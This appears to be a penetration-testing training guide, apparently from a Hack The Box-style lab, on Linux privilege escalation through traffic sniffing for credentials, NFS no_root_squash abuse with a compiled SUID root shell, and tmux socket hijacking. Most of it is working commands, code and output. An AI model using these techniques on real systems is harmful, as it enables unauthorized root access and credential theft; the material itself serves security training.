## Miscellaneous Privilege Escalation Techniques

These three techniques are situation-dependent but frequently encountered. They rely on passive observation, service misconfiguration, and session management weaknesses rather than active exploitation. 
***

## Passive Traffic Capture

If `tcpdump` is installed and your user has permission to run it, you can sniff network traffic and potentially capture plaintext credentials, hashes, or tokens. 

```bash
# Check if tcpdump is available and usable
which tcpdump
getcap /usr/sbin/tcpdump   # May have cap_net_raw set

# Capture all traffic on an interface
tcpdump -i eth0 -w /tmp/capture.pcap

# Filter for cleartext protocols directly
tcpdump -i eth0 -A port 21    # FTP
tcpdump -i eth0 -A port 23    # Telnet
tcpdump -i eth0 -A port 80    # HTTP
tcpdump -i eth0 -A port 110   # POP3
tcpdump -i eth0 -A port 143   # IMAP
tcpdump -i eth0 -A port 25    # SMTP

# Use net-creds for automated extraction from a live interface
python net-creds.py -i eth0

# Or against a saved pcap
python net-creds.py -p /tmp/capture.pcap
```

Captured hashes (Net-NTLMv2, Kerberos) can be cracked offline with Hashcat. Cleartext protocols like FTP, Telnet, HTTP Basic Auth, POP3, and SMTP often pass passwords directly on the wire, and those credentials may be reused on other services or for `su` / `sudo`. 

***

## Weak NFS Privileges

### How no_root_squash Works

By default, `root_squash` is active on NFS shares, which means any file written by a remote root user gets remapped to the unprivileged `nfsnobody` user on the server side. The `no_root_squash` option disables this, meaning your root on the attack machine becomes root on the NFS share, allowing you to write SUID-owned-by-root binaries that persist on the target.

### Enumeration

```bash
# Remote: check what shares the NFS server is exporting (no auth needed)
showmount -e 10.129.2.12

# Local (on target): check the exports config for no_root_squash
cat /etc/exports

# Confirm NFS is running
rpcinfo -p 10.129.2.12
nmap -sV -p 2049 10.129.2.12

# Check what is already mounted on the target
mount | grep nfs
cat /proc/mounts | grep nfs
```

Look specifically for shares with both `rw` and `no_root_squash` set. 

### Exploitation

The entire exploit runs as root on your attack machine, then the SUID binary is executed from the target's low-privilege shell.

```bash
# On attack machine (as root)

# Step 1: Mount the vulnerable NFS share locally
sudo mount -t nfs 10.129.2.12:/tmp /mnt

# Step 2: Write a SUID shell binary
cat << 'EOF' > /tmp/shell.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(void) {
    setuid(0); setgid(0); system("/bin/bash");
}
EOF

gcc /tmp/shell.c -o /mnt/shell

# Step 3: Set SUID bit (owned by root because no_root_squash is active)
chmod u+s /mnt/shell
ls -la /mnt/shell
# -rwsr-xr-x 1 root root 16712 shell
```

```bash
# On the target (low-privilege shell)

# Step 4: Execute the SUID binary
ls -la /tmp/shell
# -rwsr-xr-x 1 root root 16712 shell   <- SUID bit confirmed
/tmp/shell
# root@NIX02:/tmp#
id
# uid=0(root) gid=0(root)
```

If the target cannot be reached directly on port 2049 from your attack machine, forward the port through your foothold:

```bash
# Port forward 2049 from the target to your local machine via SSH
ssh -L 2049:127.0.0.1:2049 user@target_ip

# Then mount using localhost
sudo mount -t nfs 127.0.0.1:/tmp /mnt
```

***

## Hijacking Tmux Sessions

Tmux sessions that were started by a privileged user (root) and left running with a shared socket that your user can write to are directly exploitable. Attaching to the session gives you full root access without any exploit. 

### Enumeration

```bash
# Check for running tmux processes and their owners
ps aux | grep tmux
# root 4806 ... tmux -S /shareds new -s debugsess
#                    ^--- custom socket path

# Check the socket file permissions
ls -la /shareds
# srw-rw---- 1 root devs 0 Sep 1 06:27 /shareds
#               ^--- devs group can read/write this socket

# Check your own group membership
id
# groups=1000(htb),1011(devs)  <- you are in devs, you can access the socket

# Scan for any tmux sockets that are world-readable or group-accessible
find / -name "*.sock" -o -name "tmux*" 2>/dev/null | xargs ls -la 2>/dev/null
find /tmp -type s 2>/dev/null
```

### Exploitation

```bash
# Attach to the root-owned tmux session using the socket path
tmux -S /shareds

# You now have a shell inside the root-owned tmux session
id
# uid=0(root) gid=0(root) groups=0(root)
```

If the socket path is not obvious, look for it in the tmux process arguments shown by `ps aux`. The socket is always specified with `-S` in the command. 

### Creating a Shared Session (for Reference or Lab Setup)

```bash
# Root sets up a shared session with a custom socket in a group-accessible location
tmux -S /shareds new -s debugsess

# Root then makes the socket group-accessible
chown root:devs /shareds
# chmod g+rw /shareds is implicit from the srw-rw---- permissions
```

***

## Quick Reference

| Technique | Enumeration Command | Exploit Condition |
|---|---|---|
| Traffic capture | `getcap /usr/sbin/tcpdump` | `cap_net_raw` set or user in `pcap` group |
| NFS abuse | `showmount -e <ip>` and `cat /etc/exports` | Share has `rw` and `no_root_squash` |
| Tmux hijack | `ps aux \| grep tmux` and `ls -la <socket>` | Socket writable by your user or group |
